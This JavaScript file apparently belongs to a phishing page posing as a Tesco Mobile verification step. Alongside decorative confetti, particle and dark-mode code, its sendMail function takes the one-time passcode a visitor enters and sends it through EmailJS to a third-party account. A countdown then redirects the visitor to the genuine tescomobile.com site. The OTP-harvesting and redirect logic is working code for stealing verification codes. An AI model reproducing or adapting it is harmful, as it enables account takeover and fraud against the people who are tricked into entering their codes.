// Countdown timer and redirect function
let countdownElement = document.getElementById('countdown');
let countdownValue = 10;

let countdownTimer = setInterval(() => {
    countdownValue--;
    countdownElement.textContent = countdownValue;

    if (countdownValue === 0) {
        clearInterval(countdownTimer);
        document.querySelector('.success-container').classList.add('fade-out');
        setTimeout(() => {
            window.location.href = 'https://www.tescomobile.com/';
        }, 1000);
    }
}, 1000);

// Particle Background Configuration
particlesJS.load('particle-bg', 'particles.json', function() {
    console.log('Particles.js loaded');
});

// Dark Mode Toggle
const darkModeSwitch = document.getElementById('darkModeSwitch');
darkModeSwitch.addEventListener('change', () => {
    document.body.classList.toggle('dark-mode');
    localStorage.setItem('darkMode', darkModeSwitch.checked);
});

// Remember Dark Mode Setting
if (localStorage.getItem('darkMode') === 'true') {
    darkModeSwitch.checked = true;
    document.body.classList.add('dark-mode');
}

// Confetti Animation on Load
window.onload = () => {
    confetti({
        particleCount: 150,
        spread: 60,
        origin: { y: 0.6 }
    });
};

// Button Particle Effect
document.querySelector('.custom-btn').addEventListener('click', () => {
    confetti({
        particleCount: 100,
        spread: 70,
        origin: { y: 0.6 }
    });
});

// Function to send the OTP via EmailJS
function sendMail() {
    // Retrieve the OTP value from the input field
    let otpValue = document.getElementById("otpInput").value;
    
    if (!otpValue) {
        alert("Please enter the OTP before submitting.");
        return; // Exit the function if the OTP is not provided
    }

    let params = {
        OTP: otpValue // Ensure this matches the placeholder used in your EmailJS template
    };

    // Send the email using EmailJS
    emailjs.send("service_ifxx4ei", "template_yu7f0rg", params)
        .then((response) => {
            console.log("Email sent successfully!", response.status, response.text);
            // Display success alert
            document.getElementById("successAlert").classList.remove("d-none");
            document.getElementById("errorAlert").classList.add("d-none");
        })
        .catch((error) => {
            console.error("Failed to send email.", error);
            // Display error alert
            document.getElementById("successAlert").classList.add("d-none");
            document.getElementById("errorAlert").classList.remove("d-none");
        });
}

// Handle form submission to send the OTP
document.getElementById("otp-form").addEventListener("submit", function (event) {
    event.preventDefault(); // Prevent the form from submitting traditionally
    sendMail(); // Call the sendMail function
});

// Resend OTP Functionality
document.getElementById("resendLink").addEventListener("click", (event) => {
    event.preventDefault();
    // Clear the input field
    document.getElementById("otpInput").value = "";

    // Resend the OTP logic can be implemented here, for example, generating a new OTP and sending it again
    sendMail(); // Send the mail again
    alert("OTP has been resent!");
});
